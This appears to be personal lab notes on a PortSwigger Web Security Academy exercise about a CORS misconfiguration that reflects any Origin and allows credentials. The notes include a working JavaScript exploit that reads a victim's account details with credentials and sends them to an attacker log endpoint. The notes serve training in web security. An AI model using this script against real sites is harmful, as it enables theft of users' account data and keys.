First we check that if we send the parameter Origin, with a random URL. We still receive the response. This give us a clue that the web is vulnerable. 
The response show us the "Access-Control-Allow-Credentials" is true, with this we know that the cross-origin request accept credentials.   

![[Pasted image 20250211212138.png]]
Down is the next page, that basically is the response to the lab. And same script that we had received.

![[Pasted image 20250211213538.png]]
This is the script that portswigger gave us. Basically, you send a request and wait for the response. Which is save in location variable.
![[Pasted image 20250211204613.png]]
![[Pasted image 20250211204553.png]]

```Javascript
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0acc00a003dcd456807e71c900c100fc.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

```